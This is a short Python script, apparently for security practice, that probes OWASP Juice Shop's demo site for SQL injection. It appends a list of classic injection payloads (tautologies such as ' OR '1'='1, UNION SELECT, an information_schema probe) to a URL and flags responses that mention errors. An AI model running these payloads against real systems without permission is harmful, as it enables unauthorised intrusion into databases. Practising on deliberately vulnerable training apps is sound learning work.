import requests

def check_sql_injection(url, payloads):
    for payload in payloads:
        vulnerable_url = f"{url}{payload}"
        
        try:
            response = requests.get(vulnerable_url)
            # You might need to adjust this check based on Juice Shop's responses
            if "SQL" in response.text or "error" in response.text.lower():
                print(f"[!] Possible SQL Injection vulnerability found with payload: {payload}")
            else:
                print(f"[-] No vulnerability found with payload: {payload}")
        except requests.RequestException as e:
            print(f"Error accessing {vulnerable_url}: {e}")

# Example payloads
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' #",
    "' OR '1'='1' /*",
    "' UNION SELECT NULL--",
    "' OR EXISTS(SELECT * FROM information_schema.tables)--",
    "' OR 1=1--",
    "' AND 1=1--",
    "' AND 1=2--"
]

# Replace with specific Juice Shop URL with parameters
target_url = "http://demo.owasp-juice.shop/rest/user/register"
check_sql_injection(target_url, payloads)


